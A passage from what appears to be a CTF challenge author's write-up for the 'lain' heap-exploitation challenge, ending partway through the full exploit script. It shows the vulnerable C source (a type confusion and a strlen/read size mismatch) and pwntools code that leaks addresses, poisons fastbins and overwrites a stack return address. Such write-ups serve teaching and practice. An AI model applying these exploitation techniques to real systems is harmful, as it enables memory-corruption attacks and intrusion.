+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu@sha256:81bba8d1dde7fc1883b6e95cd46d6c9f4874374f2b360c8db82620b33f6b5ca1 AS app</span>
+
+<span class="k">FROM</span><span class="s"> pwn.red/jail</span>
+<span class="k">COPY</span><span class="s"> --from=app / /srv</span>
+<span class="k">COPY</span><span class="s"> lain /srv/app/run</span>
+<span class="k">COPY</span><span class="s"> flag.txt /srv/app/flag.txt</span>
+</code></pre></div></div>
+
+<p>And <a href="/files/lain">this is the binary</a>.</p>
+
+<h2 id="the-solution-1">The Solution</h2>
+<p>I won’t be explaining in detail how a heap exploit works. There is an <a href="https://github.com/shellphish/how2heap">infinite</a> <a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">amount</a> <a href="https://heap-exploitation.dhavalkapil.com/">of</a> <a href="https://youtu.be/coAJ4KyrWmY?list=PL-ymxv0nOtqr4OchXR2rV_WNhpj4ccPq1">good</a> <a href="https://www.youtube.com/watch?v=HPDBOhiKaD8">enough</a> <a href="http://phrack.org/issues/66/10.html">resources</a> <a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">about</a> <a href="https://tukan.farm/2016/07/26/ptmalloc-fanzine/">it</a> that realistically I can’t compete with them in a small postmortem blogpost like this.
+Instead I will focus on the challenge solution itself.
+First things first, I’m getting some leaks to break the ASLR. The program works on both strings and integers, but there’s a very simple type confusion thanks to that. The code that checks the operands’ types does it only once for the first one and assumes the rest of the operands are the same.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Node</span> <span class="o">*</span><span class="nf">plus_fnc</span><span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">Node</span> <span class="o">*</span><span class="n">node</span> <span class="o">=</span> <span class="n">create_node</span><span class="p">();</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">number</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">node</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">number</span><span class="p">;</span>
+    <span class="n">node</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">number</span><span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">args</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">node</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">number</span><span class="p">.</span><span class="n">value</span> <span class="o">+=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">number</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+      <span class="n">args</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">node</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">arg</span> <span class="o">=</span> <span class="n">args</span><span class="p">;</span> <span class="n">arg</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">arg</span> <span class="o">=</span> <span class="n">arg</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
+      <span class="n">new_size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">str_ptr</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">new_str</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">new_str</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"I just don't know what went wrong...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">arg</span> <span class="o">=</span> <span class="n">args</span><span class="p">;</span> <span class="n">arg</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">arg</span> <span class="o">=</span> <span class="n">arg</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kt">size_t</span> <span class="n">arg_len</span> <span class="o">=</span> <span class="n">arg</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">str_len</span><span class="p">;</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="n">new_str</span><span class="o">+</span><span class="n">offset</span><span class="p">,</span> <span class="n">arg</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">str_ptr</span><span class="p">,</span> <span class="n">arg_len</span><span class="p">);</span>
+      <span class="n">offset</span> <span class="o">+=</span> <span class="n">arg_len</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">node</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">str_ptr</span> <span class="o">=</span> <span class="n">new_str</span><span class="p">;</span>
+    <span class="n">node</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">str_len</span> <span class="o">=</span> <span class="n">new_size</span><span class="p">;</span>
+  <span class="p">}</span>
+  
+  <span class="k">return</span> <span class="n">node</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This leads to two ways of getting leaks.
+First we’re adding a number to a string. In effect we’re treating a string pointer as a number, getting a heap leak.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'(+ 0 "AABB")'</span><span class="p">)</span>
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"heap_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Another another way to get an arbitrary leak is to add a string to a number. The number will be treated as a string allowing us to leak whatever we want in the memory space.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Do a bunch of random allocations so there are libc addresses on the heap.
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'"</span><span class="si">{</span><span class="s">"C"</span> <span class="o">*</span> <span class="mi">200</span><span class="si">}</span><span class="s">" '</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'(+ </span><span class="si">{</span><span class="n">payload</span> <span class="o">*</span> <span class="mi">3</span><span class="si">}</span><span class="s"> "A")'</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1"># This is done so the string sizes are overwritten for leaking after this.
+# Because we're using malloc to allocate memory for the nodes and the memory
+# isn't cleared, we're inheriting them from the previous ones.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@@@@@@@@" "@@@@@@@@" "@@@@@@@@")'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1"># Get all the leaks.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">heap_leak</span><span class="o">+</span><span class="mi">3416</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mi">2206944</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__environ"</span><span class="p">]</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">144</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack_canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack_canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">112</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">bin_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"bin_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">bin_leak</span><span class="o">-</span><span class="mi">19776</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">heap_leak</span><span class="o">+</span><span class="mi">7208</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">heap_key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"heap_key: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_key</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now, after we get our leaks we can think of a strategy for our buffer overflow.
+We are getting the input with a <code class="language-plaintext highlighter-rouge">read</code> function, thanks to this we can have NULL bytes in our input string.
+Later in the <code class="language-plaintext highlighter-rouge">add_token</code> function we’re mixing up the size returned by calling <code class="language-plaintext highlighter-rouge">read</code> with length returned by <code class="language-plaintext highlighter-rouge">strlen</code>.
+The function <code class="language-plaintext highlighter-rouge">strlen</code> stops when it encounters a NULL byte so we can abuse this to confuse the size inside of <code class="language-plaintext highlighter-rouge">calloc</code> to return a smaller allocation than it should.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">add_token</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">token_str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">token_len</span><span class="p">,</span> <span class="n">Token</span> <span class="o">**</span><span class="n">beg</span><span class="p">,</span> <span class="n">Token</span> <span class="o">**</span><span class="n">end</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">Token</span> <span class="o">*</span><span class="n">new_token</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">Token</span><span class="p">));</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">new_token</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"I just don't know what went wrong...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">new_token</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">new_token</span><span class="o">-&gt;</span><span class="n">str</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token_str</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">new_token</span><span class="o">-&gt;</span><span class="n">str</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"I just don't know what went wrong...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">new_token</span><span class="o">-&gt;</span><span class="n">str</span><span class="p">,</span> <span class="n">token_str</span><span class="p">,</span> <span class="n">token_len</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>From this point we can proceed in infinite number of ways since we’re getting an almost arbitrarly long heap buffer overflow.
+The two most obvious methods are to either abuse fastbins or tcache.
+Fastbins are a little more constrained that tcache in modern glibc, however in this challenge <code class="language-plaintext highlighter-rouge">calloc</code>s happen earlier than <code class="language-plaintext highlighter-rouge">malloc</code>s
+so I found it easier to reason about while developing the exploit for my challenge. An another player in the ctf solved it with tcache poisoning
+but I can’t link their solution since they posted it only on the competition’s Discord server.
+So first we corrupt the heap’s metadata so it later returns a chunk inside of the stack allowing us to overwrite the return address.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Corrupt 0x20 fastbins inside of the heap so fwd ptr points to the stack.
+</span><span class="n">stack_xor</span> <span class="o">=</span> <span class="p">(</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">10392</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"##</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> \
+    <span class="n">p64</span><span class="p">((</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">10392</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span><span class="o">^</span><span class="n">heap_leak</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"BEG '</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>But that’s not all. There’s an additional check ptmalloc performs while returning a fastbin chunk, more specifically <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks">it checks if the chunk size isn’t corrupted</a>.
+To satisfy this check I’m gonna spray the stack with the correct size at the place where I wanted the chunk to be.
+When calculating offsets I specifically put the corrupted fwd ptr there, in a place where our input string is read into so I have control of what’s in there.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Spray the stack with p64(0x21) values so ptmalloc wont complain about
+# corrupted size. The overwritten fastbin points to a place on the stack
+# where there are the 0x21 values.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"aaabbbb'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1000</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And as the final step I’m allocating a string that will be put on the stack, giving us a juicy stack corruption.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Corrupt the stack. yay!
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"AAAA" "AAAA</span><span class="se">\x00</span><span class="s">BB'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> \
+                 <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'you_should_be_able_to_solve_this'</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>To wrap things up, this is the full exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./lain_patched"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">"alacritty -e"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"795db1b.678470.xyz"</span><span class="p">,</span> <span class="mi">32457</span><span class="p">)</span>
+    <span class="c1">#io = remote("0.0.0.0", 5000)
+</span><span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"./lain_patched"</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./lain_patched"</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="c1">#attach(io)
+</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'(+ 0 "AABB")'</span><span class="p">)</span>
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"heap_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># Do a bunch of random allocations so there are libc addresses on the heap.
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'"</span><span class="si">{</span><span class="s">"C"</span> <span class="o">*</span> <span class="mi">200</span><span class="si">}</span><span class="s">" '</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'(+ </span><span class="si">{</span><span class="n">payload</span> <span class="o">*</span> <span class="mi">3</span><span class="si">}</span><span class="s"> "A")'</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1"># This is done so the string sizes are overwritten for leaking after this.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@@@@@@@@" "@@@@@@@@" "@@@@@@@@")'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1"># Get all the leaks.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">heap_leak</span><span class="o">+</span><span class="mi">3416</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mi">2206944</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__environ"</span><span class="p">]</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">144</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack_canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack_canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
